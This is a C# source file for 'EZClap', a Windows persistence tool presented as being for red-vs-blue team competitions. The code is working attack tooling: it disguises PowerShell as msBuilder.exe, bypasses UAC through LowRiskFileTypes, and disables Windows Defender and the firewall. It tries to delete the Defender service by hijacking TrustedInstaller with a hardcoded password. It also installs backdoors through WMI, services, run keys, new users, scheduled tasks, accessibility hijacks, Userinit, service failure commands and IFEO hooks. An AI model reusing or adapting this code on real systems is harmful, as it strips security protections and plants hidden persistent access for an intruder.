using System;
using System.Configuration;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Collections.Generic;
using Microsoft.Win32;
using CommandLine;
using System.IO;

/*
 *  Name: EZClap 
 *  Description: EZClap is a Windows Userland persistence tool which was created for educational purposes in 
 *  Red vs. Blue team competitions. As the tool is targetted towards beginners in Windows Security, most of the 
 *  mechanisms are easy to detect through usage of sysinternal tools or simple cmd/powershell commands.
 * 
 *  Configuration:
 *      - Change the app.config file. It's fine to use the default configuration setting, though. 
 * 
 *  Modules: 
 *      - As EZClap (tried to be) is modular, simply add a module, and call it in the main function. 
 *      For every new module, app.config needs to be changed as well. But it should be easy to do so. 
 * 
 */

namespace ezclap
{
    class Program
    {
        public static void copyPayload(string originPayloadLoc, string[] newLoc)
        {
            foreach (var destination in newLoc)
            {
                try
                {
                    System.IO.File.Copy(originPayloadLoc, destination, true);
                }
                catch(Exception ex)
                {
                    continue;
                }
            }
        }
        /*
         *  Name: setup 
         *  Description: Basic setup script which performs various tasks 
         *      - 1. Copy powershell as msBuilder.exe 
         *      - 2. Change LowRiskFileTypes to bypass UAC 
         *      - 3. Copy .exe payload into different locations 
         *      - 4. Disable WinDefender - Temp 
         *      - 5. Drop Firewall 
         *      - 6. Permanently disable Windows Defender 
         *      
         *  Params:
         *      - (string) originPayloadLoc - Original payload location 
         *      - (string[]) newLoc - Destination location which the original payloads will be copied to 
         * 
         */
        public static void setup(bool binary, string originPayloadLoc, string[] newLoc)
        {

            // 1. Copy powershell as msBuilder.exe 
            string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            string destPath = @"C:\Windows\System32\msBuilder.exe";
            try
            {
                System.IO.File.Copy(srcPath, destPath, true);
            }
            catch(Exception ex)
            {
                System.Environment.Exit(1);
            }
            

            // 2. change LowRiskFileTypes to bypass UAC 
            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            //Console.WriteLine(RegistryKeys.hklmImagePath);

            // 3. Copy payload into different locations 
            if (binary == true)
                copyPayload(originPayloadLoc, newLoc);

            // 4. Disable WinDefender - Temp 
            string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
            string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
            string noSubmit = "Set-MpPreference -SubmitSamplesConsent 2";

            Process.Start(@"powershell.exe", noRealTime);
            Process.Start(@"powershell.exe", excludeC);
            Process.Start(@"powershell.exe", noSubmit);

            // 5. Drop firewall 
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            string netsh = "netsh.exe";
            proc.StartInfo.Arguments = "Advfirewall set allprofile state off";
            proc.StartInfo.FileName = netsh;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            proc.WaitForExit();

            // 6. Disable WinDefender - For Good 
            Utils.setHKLMSubKey(RegistryKeys.hklmDefender, "DisableAntiSpyware", 1);



            // 6. Erase WinDefender - THIS MIGHT CAUSE HAVOC, WATCH OUT TODO: 
            /*
            string argss = "sc config TrustedInstaller binPath= \"cmd.exe /C sc stop windefend && sc delete windefend\" && sc start TrustedInstaller";
            try
            {
                Process.Start(@"cmd.exe", argss);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Access should be denied");
            }
            */
            
            try
            {
                proc = new Process();
                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                proc.StartInfo.UseShellExecute = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.Verb = "runas";
                proc.StartInfo.UserName = "joe";
                System.Security.SecureString securePassword = new System.Security.SecureString();
                string password = "LetRedIn!123";
                foreach (char c in password.ToCharArray())
                    securePassword.AppendChar(c);
                proc.StartInfo.Password = securePassword;
                proc.StartInfo.Arguments = "sc config TrustedInstaller binPath= \"cmd.exe /C sc stop windefend && sc delete windefend\" && sc start TrustedInstaller";
                proc.Start();
                proc.WaitForExit();
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] Access should be denied");
            }
            

        }

        public static void modifyImageFileExec(string[] payload)
        {
            Random rnd = new Random();

            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe", "Autoruns64.exe", "Autoruns.exe", "chrome.exe", "powershell.exe", "cmd.exe" };
            foreach (string target in targetExec)
            {
                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);

                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload[rnd.Next(0, payload.Length - 1)]);

            }
        }

        public class Options
        {
            [Option('v',"verbose", Required = false, HelpText = "Set output to verbose")]
            public bool Verbose { get; set; }

            [Option('b', "binary", Required = false, HelpText = "Set output to verbose")]
            public string Binary { get; set; }
            [Option('c', "command", Required = false, HelpText = "Set output to verbose")]
            public string Command { get; set; }
            [Option('t', "techniques", Required = true, HelpText = "Set output to verbose")]
            public string Techniques { get; set; }
        }

        static void Main(string[] args)
        {

            /* ----- Initializing variables  ----- */
            Random rnd = new Random();
            string originalPayloadLoc = "";
            var binaryPayload = new List<string>();
            var commandPayload = new List<string>();
            var techniques = new List<string>();
            bool binaryBool = false;
            bool all = false;
            var payloadArr = new string[0];

            /* ----- Argument Parsing Begins  ----- */
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                /* ----- Arg Parse for payloads. Either binary or command   ----- */
                if (o.Binary != null)
                {
                    Console.WriteLine("[+] Binary payload selected: " + o.Binary);

                    if (File.Exists(o.Binary))
                        Console.WriteLine("[+] File exists.");
                    else
                    { Console.WriteLine("[-] File does not exist."); System.Environment.Exit(1); }

                    binaryBool = true;
                    originalPayloadLoc = o.Binary;
                    binaryPayload = Utils.parseConfig("payload", "name");
                }
                // Command is selected
                else if (o.Command != null)
                {
                    binaryBool = false;
                    Console.WriteLine("[+] Command payload selected: " + o.Command);
                    commandPayload.Add(o.Command);
                }
                // No payloads selected. Exit.
                else
                {
                    Console.WriteLine("[-] Payload not selected. Use (-b) or (-c) or payloads. Exiting.");
                    System.Environment.Exit(1);
                }

                /* ----- Arg Parse for techniques   ----- */
                if (o.Techniques != null)
                {
               
                    // If all, add all techniques 
                    if (o.Techniques == "all")
                    {
                        techniques.Add("wmi");
                        techniques.Add("service");
                        techniques.Add("user");
                        techniques.Add("schtask");
                        techniques.Add("access");
                        techniques.Add("userinit");
                        techniques.Add("failure");
                        techniques.Add("runkey");
                        techniques.Add("secretkey");
                        techniques.Add("imagefile");
                    }
                    
                    // If selected, only add selected techniques 
                    else
                    {
                        string[] techs = o.Techniques.Split(',');
                        foreach (var tech in techs)
                            techniques.Add(tech);

                    }
                }
                else
                {
                    Console.WriteLine("[-] Techniques not selected. Exiting.");
                    System.Environment.Exit(1);
                }


                var binaryPayloadArr = binaryPayload.ToArray();
                var commandPayloadArr = commandPayload.ToArray();

                // Setup before the persist techniques 
                // If binary payload selected, make payloadArr to be binary payload 
                if (o.Binary != null)
                {
                    setup(binaryBool, originalPayloadLoc, binaryPayloadArr);
                    payloadArr = binaryPayloadArr;
                }
                // Else, make payloadArr to be command payload 
                else
                {
                    setup(binaryBool, "", new string[0]);
                    payloadArr = commandPayloadArr;
                
                }

            });


            /* -----   Start of implementing persistence techniques   ----- */


            // Actually Execute Persistence techniques 
            foreach (var technique in techniques)
            {
                if (technique == "wmi")
                {
                    var WMIName = Utils.parseConfig("techniques/AddWMI", "name").ToArray();
                    Array.ForEach(WMIName, element => Console.WriteLine(element));
                    AddWMI persistWMI = new AddWMI(WMIName, payloadArr);
                }

                if(technique == "service")
                {
                    var serviceName = Utils.parseConfig("techniques/AddService", "name").ToArray();
                    AddService persistService = new AddService(serviceName, payloadArr);
                }

                if(technique == "runkey")
                {
                    string[] runKeyName = Utils.parseConfig("techniques/AddRunKey", "name").ToArray();
                    AddRunKey persistRunKey = new AddRunKey(runKeyName, payloadArr[rnd.Next(0, payloadArr.Length - 1)]);
                }

                if(technique == "user")
                {
                    string[] userNames = Utils.parseConfig("techniques/AddUser", "usernames").ToArray();
                    string[] password = Utils.parseConfig("techniques/AddUser", "password").ToArray(); ;
                    string[] groups = Utils.parseConfig("techniques/AddUser", "groups").ToArray(); ;
                    AddUser persistUser = new AddUser(userNames, password[0], groups);
                }

                if(technique == "schtask")
                {
                    string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name").ToArray(); ;
                    string[] intervalString = Utils.parseConfig("techniques/AddScheduledTask", "interval").ToArray(); ;
                    double interval = Convert.ToDouble(intervalString[0]);
                    AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, payloadArr, interval);
                }

                if(technique == "access")
                {
                    AddAccessibility persistAccessibility = new AddAccessibility(payloadArr);
                }

                if(technique == "userinit")
                {
                    Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payloadArr[rnd.Next(0, payloadArr.Length - 1)] + ", C:\\Windows\\System32\\userinit.exe");
                }

                if(technique == "failure")
                {
                    List<string> servicesList = Utils.getAllServices();
                    AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payloadArr);
                }

                if(technique == "imagefile")
                {
                    modifyImageFileExec(payloadArr);
                }

                if(technique == "secretkey" && binaryBool == true)
                {
                    AddSecretKey persistSecretKey = new AddSecretKey(payloadArr[0]);
                }

                //System.IO.File.Delete(originalPayloadLoc);
            }



            Console.WriteLine("[+] All persistence mechanisms are done.");
            System.Environment.Exit(1);

        }
    }
}
